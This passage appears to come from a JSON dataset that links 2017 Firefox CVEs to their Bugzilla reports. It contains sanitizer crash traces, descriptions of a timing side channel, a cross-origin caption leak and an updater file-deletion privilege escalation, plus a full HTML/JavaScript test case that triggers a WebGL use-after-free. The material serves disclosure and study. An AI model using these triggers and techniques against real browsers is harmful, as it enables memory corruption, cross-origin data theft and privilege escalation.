nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3565:5 #76 0x7f46da565487 in mozilla::PresShell::Paint(nsView*, nsRegion const&, unsigned int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:6481:5 #77 0x7f46d9d6c897 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget*) /home/worker/workspace/build/src/view/nsViewManager.cpp:484:7 #78 0x7f46d9d6be97 in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:416:9 #79 0x7f46d9d6f40d in nsViewManager::ProcessPendingUpdates() /home/worker/workspace/build/src/view/nsViewManager.cpp:1105:5 #80 0x7f46da4bfc8a in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2037:7 #81 0x7f46da4cbd25 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:305:7 #82 0x7f46da4cb9f4 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:327:5 #83 0x7f46da4ce063 in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:722:5 #84 0x7f46da4ce063 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:631 #85 0x7f46da4c9157 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::ParentProcessVsyncNotifier::Run() /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:508:9 #86 0x7f46d3c2db89 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #87 0x7f46d3c2a480 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #88 0x7f46d4a43eb4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:124:5 #89 0x7f46d49b5028 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #90 0x7f46d49b5028 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #91 0x7f46d49b5028 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #92 0x7f46d9ded82f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #93 0x7f46dd430051 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #94 0x7f46dd5edc0c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4470:10 #95 0x7f46dd5ef708 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4647:8 #96 0x7f46dd5f09cc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4738:16 #97 0x4dfebf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:234:10 #98 0x4dfebf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:305 #99 0x7f46eefdb82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #100 0x41c2e8 in _start (/home/ifratric/p0/latest/firefox/firefox+0x41c2e8) 0x60b000214ce8 is located 88 bytes inside of 112-byte region [0x60b000214c90,0x60b000214d00) freed by thread T0 here: #0 0x4b2a3b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f46d3acb2c4 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9 #2 0x7f46d3acaeb6 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7f46d53d990e in AsyncFreeSnowWhite::Run() /home/worker/workspace/build/src/js/xpconnect/src/XPCJSContext.cpp:145:34 #4 0x7f46d3c2db89 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #5 0x7f46d3c2a480 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #6 0x7f46d4a43ebf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #7 0x7f46d49b5028 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #8 0x7f46d49b5028 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #9 0x7f46d49b5028 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #10 0x7f46d9ded82f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #11 0x7f46dd430051 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #12 0x7f46dd5edc0c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4470:10 #13 0x7f46dd5ef708 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4647:8 #14 0x7f46dd5f09cc in XRE_main(int, char**, mozilla::BootstrapConfig const&) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4738:16 #15 0x4dfebf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:234:10 #16 0x4dfebf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:305 #17 0x7f46eefdb82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 previously allocated by thread T0 here: #0 0x4b2d5b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e10cd in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f46d6796c00 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f46d6796c00 in nsRange::CloneRange() const /home/worker/workspace/build/src/dom/base/nsRange.cpp:2495 #4 0x7f46d67970ba in nsRange::CloneRange(nsIDOMRange**) /home/worker/workspace/build/src/dom/base/nsRange.cpp:2507:14 #5 0x7f46d66801d4 in nsHTMLCopyEncoder::SetSelection(nsISelection*) /home/worker/workspace/build/src/dom/base/nsDocumentEncoder.cpp:1426:5 #6 0x7f46d6596c5e in SelectionCopyHelper(nsISelection*, nsIDocument*, bool, short, unsigned int, nsITransferable**) /home/worker/workspace/build/src/dom/base/nsCopySupport.cpp:199:10 #7 0x7f46da97e9ee in nsAutoCopyListener::NotifySelectionChanged(nsIDOMDocument*, nsISelection*, short) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6667:10 #8 0x7f46da95f019 in mozilla::dom::Selection::NotifySelectionListeners() /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6254:5 #9 0x7f46da97806c in NotifySelectionListeners /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:2429:12 #10 0x7f46da97806c in mozilla::dom::Selection::Extend(nsINode&, unsigned int, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:5762 #11 0x7f46da9533e7 in Extend /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:5474:3 #12 0x7f46da9533e7 in nsFrameSelection::TakeFocus(nsIContent*, unsigned int, unsigned int, mozilla::CaretAssociationHint, bool, bool) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:1873 #13 0x7f46da94ebaf in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:1160:14 #14 0x7f46da97c97d in mozilla::dom::Selection::Modify(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6426:8 #15 0x7f46d730a949 in mozilla::dom::SelectionBinding::modify(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Selection*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/SelectionBinding.cpp:778:3 #16 0x7f46d7fdbf77 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2951:13 #17 0x7f46dda78c24 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:281:15 #18 0x7f46dda78c24 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:463 #19 0x7f46dda5ef88 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:514:12 #20 0x7f46dda5ef88 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2960 #21 0x7f46dda4411a in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:409:12 #22 0x7f46dda78eb7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:481:15 #23 0x7f46dda79552 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:527:10 #24 0x7f46de426f3c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2865:12 #25 0x7f46d7b59632 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #26 0x7f46d845fbbd in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #27 0x7f46d845fbbd in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #28 0x7f46d842a6f9 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1123:16 #29 0x7f46d842c5b4 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #30 0x7f46d8416eb3 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:5 #31 0x7f46d841a744 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #32 0x7f46da62158e in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1044:7 #33 0x7f46dcae3e7f in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7632:5 #34 0x7f46dcadfc44 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7426:7 #35 0x7f46dcae765f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7323:13 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:308:36 in operator! Shadow bytes around the buggy address: 0x0c168003a940: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c168003a950: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa 0x0c168003a960: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 0x0c168003a970: 00 00 00 fa fa fa fa fa fa fa fa fa fd fd fd fd 0x0c168003a980: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa =>0x0c168003a990: fa fa fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd 0x0c168003a9a0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c168003a9b0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd 0x0c168003a9c0: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c168003a9d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd 0x0c168003a9e0: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==119582==ABORTING"
      }
    ],
    "CVE-2017-5406": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1306890",
        "title": "SEGV in SkBlitLCD16OpaqueRow_SSE2",
        "description": "Tested on: OS: Ubuntu 16.04.1 LTS Firefox: ASAN-build moz_source_stamp: f713114b8c8d352b668b3e8052bc51ece4df34e0 prefs.js from https://github.com/MozillaSecurity/fuzzdata/blob/master/settings/firefox/prefs.js ASAN-trace: ASAN:DEADLYSIGNAL ================================================================= ==2203==ERROR: AddressSanitizer: SEGV on unknown address 0x11dfdd40f2ff (pc 0x7ffb1f2b6e47 bp 0x7fffa27f3960 sp 0x7fffa27f3930 T0) #0 0x7ffb1f2b6e46 in SkBlitLCD16OpaqueRow_SSE2(unsigned int*, unsigned short const*, unsigned int, int, unsigned int) /home/worker/workspace/build/src/gfx/skia/skia/src/opts/SkBlitRow_opts_SSE2.cpp:459:57 #1 0x7ffb1f356e51 in D32_LCD16_Proc /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkBlitMask_D32.cpp:46:9 #2 0x7ffb1f356e51 in SkBlitMask::BlitColor(SkPixmap const&, SkMask const&, SkIRect const&, unsigned int) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkBlitMask_D32.cpp:67 #3 0x7ffb1f14be95 in SkARGB32_Opaque_Blitter::blitMask(SkMask const&, SkIRect const&) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkBlitter_ARGB32.cpp:188:9 #4 0x7ffb1f64ede2 in DrawOneGlyph::blitMask(SkMask const&, SkIRect const&) const /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.cpp:1551:13 #5 0x7ffb1f64e540 in DrawOneGlyph::operator()(SkGlyph const&, SkPoint, SkPoint) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.cpp:1511:17 #6 0x7ffb1f6512dd in SkFindAndPlaceGlyph::GlyphFindAndPlaceFullPixel<DrawOneGlyph&, (SkPaint::Align)0, (SkFindAndPlaceGlyph::SelectKerning)0>::findAndPositionGlyph(char const**, SkPoint, DrawOneGlyph&) /home/w orker/workspace/build/src/gfx/skia/skia/src/core/SkFindAndPlaceGlyph.h:504:17 #7 0x7ffb1f6479bb in void SkFindAndPlaceGlyph::ProcessPosText<DrawOneGlyph&>(SkPaint::TextEncoding, char const*, unsigned long, SkPoint, SkMatrix const&, float const*, int, SkPaint::Align, SkGlyphCache*, DrawO neGlyph&) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkFindAndPlaceGlyph.h:685:9 #8 0x7ffb1f646906 in SkDraw::drawPosText(char const*, unsigned long, float const*, int, SkPoint const&, SkPaint const&) const /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.cpp:1676:5 #9 0x7ffb1f3351ba in SkBitmapDevice::drawPosText(SkDraw const&, void const*, unsigned long, float const*, int, SkPoint const&, SkPaint const&) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkBitmapDe vice.cpp:345:5 #10 0x7ffb1f38c0b0 in SkCanvas::onDrawPosText(void const*, unsigned long, SkPoint const*, SkPaint const&) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkCanvas.cpp:2576:9 #11 0x7ffb1f38e33f in SkCanvas::drawPosText(void const*, unsigned long, SkPoint const*, SkPaint const&) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkCanvas.cpp:2651:5 #12 0x7ffb17965856 in mozilla::gfx::DrawTargetSkia::FillGlyphs(mozilla::gfx::ScaledFont*, mozilla::gfx::GlyphBuffer const&, mozilla::gfx::Pattern const&, mozilla::gfx::DrawOptions const&, mozilla::gfx::GlyphRe nderingOptions const*) /home/worker/workspace/build/src/gfx/2d/DrawTargetSkia.cpp:1328:3 #13 0x7ffb18032bed in GlyphBufferAzure::Flush(bool) /home/worker/workspace/build/src/gfx/thebes/gfxFont.cpp:1666:21 #14 0x7ffb17ffd9e3 in ~GlyphBufferAzure /home/worker/workspace/build/src/gfx/thebes/gfxFont.cpp:1569:9 #15 0x7ffb17ffd9e3 in gfxFont::DrawGlyphs(gfxShapedText const*, unsigned int, unsigned int, gfxPoint*, TextRunDrawParams const&, FontDrawParams const&) /home/worker/workspace/build/src/gfx/thebes/gfxFont.cpp:1 968 #16 0x7ffb1800156b in gfxFont::Draw(gfxTextRun const*, unsigned int, unsigned int, gfxPoint*, TextRunDrawParams const&, unsigned short) /home/worker/workspace/build/src/gfx/thebes/gfxFont.cpp:2156:9 #17 0x7ffb18070b4d in gfxTextRun::DrawGlyphs(gfxFont*, gfxTextRun::Range, gfxPoint*, gfxTextRun::PropertyProvider*, gfxTextRun::Range, TextRunDrawParams&, unsigned short) const /home/worker/workspace/build/src /gfx/thebes/gfxTextRun.cpp:413:5 #18 0x7ffb18073617 in gfxTextRun::Draw(gfxTextRun::Range, gfxPoint, gfxTextRun::DrawParams const&) const /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:667:9 #19 0x7ffb1cf2e581 in DrawTextRun(gfxTextRun const*, gfxPoint const&, gfxTextRun::Range, nsTextFrame::DrawTextRunParams const&) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:6835:7 #20 0x7ffb1cf2da56 in nsTextFrame::DrawTextRun(gfxTextRun::Range, gfxPoint const&, nsTextFrame::DrawTextRunParams const&) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:6845:3 #21 0x7ffb1cf231f8 in nsTextFrame::DrawText(gfxTextRun::Range, gfxPoint const&, nsTextFrame::DrawTextParams const&) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:7028:5 #22 0x7ffb1cf16139 in nsTextFrame::PaintText(nsTextFrame::PaintTextParams const&, nsCharClipDisplayItem const&, float) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:6799:3 #23 0x7ffb1d0967b2 in SVGTextFrame::PaintSVG(gfxContext&, gfxMatrix const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:3691:9 #24 0x7ffb1d095043 in nsDisplaySVGText::Paint(nsDisplayListBuilder*, nsRenderingContext*) /home/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:3122:23 . . . AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/gfx/skia/skia/src/opts/SkBlitRow_opts_SSE2.cpp:459:57 in SkBlitLCD16OpaqueRow_SSE2(unsigned int*, unsigned short const*, unsigned int, int, unsigned int) ==2203==ABORTING"
      }
    ],
    "CVE-2017-5407": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1336622",
        "title": "Pixelstealing and history-stealing through floating-point timing side channel with SVG filters.",
        "description": "This is a continuation of https://bugzilla.mozilla.org/show_bug.cgi?id=1131288 that now works on all versions of Firefox. By rendering SVG filters that don't use the fixed point math implementation over a victim iframe the attacking page can extract pixel information. This leads to SOP violations (reading cross origin visual data) and history sniffing. I'm attaching a PoC that works on all current versions of Firefox. It uses the feSpecularLighting SVG filter. Specifically, it uses the fact that the alpha channel of the input is multiplied against the surfaceScale property. By setting the surfaceScale to a subnormal value, we can observe rendering time differences between a black input or a white input. (0*subnormal vs normal*subnormal can have a ~20x difference in speed). It looks like a number of the filters (feConvolveMatrix, etc) have been ported to a fixed point implementation. This trick is likely to work on more than just the specular lighting filter, but only ones still using fp math. This attack will be included in a USENIX Security submission (2/16), but even if accepted it won't be public for several months. (If the PoC is giving you problems, try reloading it and changing the multiplier to something higher. Less than 2000 should still work correctly.)"
      }
    ],
    "CVE-2017-5408": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1313711",
        "title": "Same-Origin-Policy violation via Text Track",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20161024030205 Steps to reproduce: Repro at https://whytls.com/test/crossorigin/index.html Actual results: The video refers to a cross-origin text track file; the text tracks are used in the video despite no CORS header permitting cross-origin use. JavaScript can steal the content of the VTT text using <trackId>.track.cues[i].getCueAsHTML(). Expected results: Captions should not be loaded unless a CORS directive on the VTT response permits cross-origin read access."
      }
    ],
    "CVE-2017-5409": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1321814",
        "title": "Maintenance Service Updater Callback Parameter File Deletion Elevation of Privilege",
        "description": "It is possible to exploit the updater as a non privileged user to delete an arbitrary file by passing a special path to the callback parameter of the updater via the Mozilla Maintenance Service. During the update the callback parameter is used to generate a path to delete a file by appending a \".moz-callback\" suffix (updater.cpp:3505). The result buffer of this operation has the length MAX_PATH (260) if the result is larger it will truncated. This can be exploited to bypass the appending operation and to delete a file, which has a path with the length 259. Further with relative path components this can be exploited to delete files with a smaller absolute path. With the ability to delete arbitrary files it´s possible to elevate privilege further. I have tested the poc with the current nightly version of firefox and windows 7. It deletes the firefox.exe at 'C:\\Program Files (x86)\\Nightly\\firefox.exe'."
      }
    ],
    "CVE-2017-5410": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1330687",
        "title": "More memory corruption issues in nightly build from 01/10/17",
        "description": "This is even more interesting. Following a memory corruption crash of a tab involving gfx rendering(which I will follow up on) once the tab(s) were recovered, I left ff setting a minute and came to the attached screenshot. It's worrisome because not only does it show memory corruption and issues involving threading(see bug 1330173) it also shows what seems be a use after free issue in play. I have to say this is a major headache because I just triggered the tab crashes for the first time. Right now I have to try to figure out STR for that and see if it just happens to turn into this again. Not to mention I'm supposed to doing some work google right now =/ See the attached screenshot for the goods."
      }
    ],
    "CVE-2017-5411": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1325511",
        "title": "libGLES - Use After Free in Buffer11::updateBufferStorage()",
        "description": "Reproduction test case: <html><body ><canvas id=\"test\"></canvas></body><script> var canvas0=document.getElementById(\"test\"); var gl = canvas0.getContext(\"webgl2\"); var buffer0= gl.createBuffer(); gl.bindBuffer(gl.UNIFORM_BUFFER, buffer0); gl.bindBuffer(gl.ARRAY_BUFFER, buffer0); var myImage = new Image();myImage.src = \"non.jpg\";myImage.onerror = function(){ canvas0.width = \"418\";} var observer0 =new MutationObserver(function listener1(event) { if( typeof listener1.counter == \"undefined\"){listener1.counter = 0;} if(listener1.counter > 3) return; listener1.counter++; var vertices = [ 1.0, 1.0, 0.0, -1.0, 1.0, 0.0, 1.0, -1.0, 0.0, -1.0, -1.0, 0.0]; gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);; canvas0.width = \"418\"; gl.bufferData(gl.UNIFORM_BUFFER, 2626,gl.STATIC_COPY); }); observer0.observe(canvas0, {attributes: true}); var timeout0 = setTimeout(function(){ gl.bufferData(gl.ARRAY_BUFFER, 2167,gl.STREAM_DRAW); }, 74); </script></html> Steps to reproduce: 1. Open the test case UAF_updateBufferStorage_Repro.html in Firefox browser. Firefox version: 53.0a1 (2016-12-22) (32-bit) OS: Windows 10 Stack trace: (615c.6088): Access violation - code c0000005 (!!! second chance !!!) eax=e5e5e5e5 ebx=11ab9280 ecx=11ab9280 edx=0dc8ba00 esi=11afc280 edi=11afc280 eip=65181b4d esp=010fdea4 ebp=010fded8 iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210246 libGLESv2!rx::Buffer11::updateBufferStorage+0xdb: 65181b4d ff5008 call dword ptr [eax+8] ds:002b:e5e5e5ed=???????? 2:059> !analyze -v ******************************************************************************* * * * Exception Analysis * * * ******************************************************************************* FAULTING_IP: libGLESv2!rx::Buffer11::updateBufferStorage+db [c:\\builds\\moz2_slave\\m-cen-w32-ntly-000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\buffer11.cpp @ 807] 65181b4d ff5008 call dword ptr [eax+8] EXCEPTION_RECORD: (.exr -1) ExceptionAddress: 65181b4d (libGLESv2!rx::Buffer11::updateBufferStorage+0x000000db) ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000000 NumberParameters: 2 Parameter[0]: 00000000 Parameter[1]: e5e5e5ed Attempt to read from address e5e5e5ed FAULTING_THREAD: 00006088 PROCESS_NAME: firefox.exe ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s. EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s. EXCEPTION_PARAMETER1: 00000000 EXCEPTION_PARAMETER2: e5e5e5ed READ_ADDRESS: e5e5e5ed FOLLOWUP_IP: libGLESv2!rx::Buffer11::updateBufferStorage+db [c:\\builds\\moz2_slave\\m-cen-w32-ntly-000000000000000\\build\\src\\gfx\\angle\\src\\libangle\\renderer\\d3d\\d3d11\\buffer11.cpp @ 807] 65181b4d ff5008 call dword ptr [eax+8] NTGLOBALFLAG: 400 APPLICATION_VERIFIER_FLAGS: 0 APP: firefox.exe ANALYSIS_VERSION: 10.0.10240.9 x86fre BUGCHECK_STR: INVALID_POINTER_READ_IN_CALL DEFAULT_BUCKET_ID: INVALID_POINTER_READ_IN_CALL LAST_CONTROL_TRANSFER: from 6518175f to 65181b4d STACK_TEXT: 010fded8 6518175f 010fdefc 11ab9280 00000000 libGLESv2!rx::Buffer11::updateBufferStorage+0xdb 010fdf08 65180d5c 010fdf20 00000000 1189ac40 libGLESv2!rx::Buffer11::getBufferStorage+0x85 010fdf34 65180e2e 010fdf50 00000000 1189ac40 libGLESv2!rx::Buffer11::getSystemMemoryStorage+0x13 010fdf64 65180cad 010fdf88 00008892 1159b000 libGLESv2!rx::Buffer11::setSubData+0x94 010fdf94 65213ca0 010fdfbc 00008892 1159b000 libGLESv2!rx::Buffer11::setData+0x29 010fdfd4 6514a85d 00008892 00000877 1159b000 libGLESv2!gl::Context::bufferData+0x34 010fdff0 67e716e5 00008892 00000877 1159b000 libGLESv2!gl::BufferData+0x40 010fe010 682c7787 00008892 00000877 1159b000 xul!mozilla::gl::GLContext::fBufferData+0x1a 010fe070 682ce0fd 00008892 00000877 1159b000 xul!mozilla::WebGLBuffer::BufferData+0xc3 010fe0a8 682ce03e 00008892 00000877 1159b000 xul!mozilla::WebGLContext::BufferDataImpl+0x48 010fe0e0 6817cb2e 00008892 00000877 00000000 xul!mozilla::WebGLContext::BufferData+0x82 010fe160 672dee29 075a2000 010fe1b8 118db800 xul!mozilla::dom::WebGL2RenderingContextBinding::bufferData+0x2d8 010fe204 672de265 00000000 075a2000 00000000 xul!js::InternalCallOrConstruct+0x5b9 010fe228 672eb010 075a2000 00000001 11b3d200 xul!InternalCall+0xb5 010feb68 67864471 010fec80 010fec80 010fec80 xul!Interpret+0x5990 010febf8 672deb00 075a2000 010fec70 010fed30 xul!js::RunScript+0x231 010fec94 672cbfb8 00000000 010fedec 075a2000 xul!js::InternalCallOrConstruct+0x290 010fecbc 672cb707 010fee38 010feed8 010fee08 xul!js::Call+0x81 010fedb4 671916d5 010feed8 010fee38 010fee08 xul!JS::Call+0x107 010feeac 67191550 075a2000 010feed8 11ad2adc xul!mozilla::dom::Function::Call+0x14f 010ff004 6719133d 010ff038 11ad2adc 010ff080 